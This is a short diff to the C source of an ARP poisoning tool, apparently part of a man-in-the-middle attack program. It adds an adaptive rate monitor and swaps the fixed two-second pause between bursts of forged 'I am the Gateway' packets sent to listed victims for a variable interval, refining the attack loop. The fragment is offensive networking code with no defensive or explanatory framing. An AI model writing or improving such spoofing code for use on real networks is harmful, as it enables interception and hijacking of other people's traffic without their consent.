@@ -1,6 +1,7 @@
 #include "arp_poison.h"
 #include "arp_scan.h" // For struct arp_header definition
 #include "ndp_block.h"
+#include "utils_rate.h"
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
@@ -95,6 +96,9 @@ void start_poisoning(struct Victim *victims, int victim_count,
   }
 
   // Infinite loop sending forged packets
+  // Initialize Adaptive Rate Monitor
+  init_rate_monitor(gateway_mac, gateway_ipv6_ll);
+
   while (1) {
     for (int i = 0; i < victim_count; i++) {
       // 1. Tell Victim: "I am the Gateway"
@@ -117,8 +121,9 @@ void start_poisoning(struct Victim *victims, int victim_count,
       }
     }
 
-    printf("Poison packets sent. Sleeping...\n");
-    sleep(2); // Wait before re-poisoning
+    float interval = get_adaptive_interval();
+    printf("Poison packets sent. Sleeping %.1fs...\n", interval);
+    usleep((useconds_t)(interval * 1000000));
   }
 
   free(my_mac);
